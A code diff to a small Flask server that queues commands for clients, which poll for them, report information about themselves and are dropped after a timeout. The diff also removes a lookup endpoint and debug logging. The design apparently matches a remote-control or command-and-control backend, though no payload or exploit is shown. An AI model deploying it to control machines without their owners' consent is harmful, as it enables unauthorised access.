@@ -5,8 +5,9 @@ import time
 app = Flask(__name__)
 commands = {}
 active_users = {}
+user_info = {}
 lock = Lock()
-info_data = {} 
+
 USER_TIMEOUT = 10
 
 @app.route('/send', methods=['POST'])
@@ -31,9 +32,9 @@ def send_command():
 @app.route('/poll/<userid>')
 def poll(userid):
     with lock:
-        active_users[str(userid)] = time.time()
-        cmds = commands.get(str(userid), [])
-        commands[str(userid)] = []
+        active_users[userid] = time.time()
+        cmds = commands.get(userid, [])
+        commands[userid] = []
     return jsonify(cmds)
 
 @app.route('/active')
@@ -44,9 +45,10 @@ def get_active_users():
 @app.route('/disconnect', methods=['POST'])
 def disconnect():
     data = request.get_json()
-    userid = str(data.get('userid'))
+    userid = data.get('userid')
     with lock:
         active_users.pop(userid, None)
+        user_info.pop(userid, None)
     return jsonify({"status": "disconnected", "userid": userid})
 
 @app.route('/info_report', methods=['POST'])
@@ -56,29 +58,18 @@ def info_report():
     if not userid:
         return jsonify({"error": "userid missing"}), 400
     with lock:
-        info_data[userid] = data
-    return jsonify({"status": "info received"})
-
-@app.route('/get_info/<userid>')
-def get_info(userid):
-    with lock:
-        info = info_data.get(userid)
-    if info:
-        return jsonify(info)
-    return jsonify({"error": "no info"}), 404
+        user_info[userid] = data
+    return jsonify({"status": "info stored", "userid": userid})
 
 def cleanup_inactive_users():
     while True:
         time.sleep(5)
         now = time.time()
         with lock:
-            print(f"[Cleanup] Active users before cleanup: {list(active_users.keys())}")
             inactive = [uid for uid, last_seen in active_users.items() if now - last_seen > USER_TIMEOUT]
-            if inactive:
-                print(f"[Cleanup] Removing inactive users: {inactive}")
             for uid in inactive:
                 del active_users[uid]
-            print(f"[Cleanup] Active users after cleanup: {list(active_users.keys())}")
+                user_info.pop(uid, None)
 
 Thread(target=cleanup_inactive_users, daemon=True).start()
 
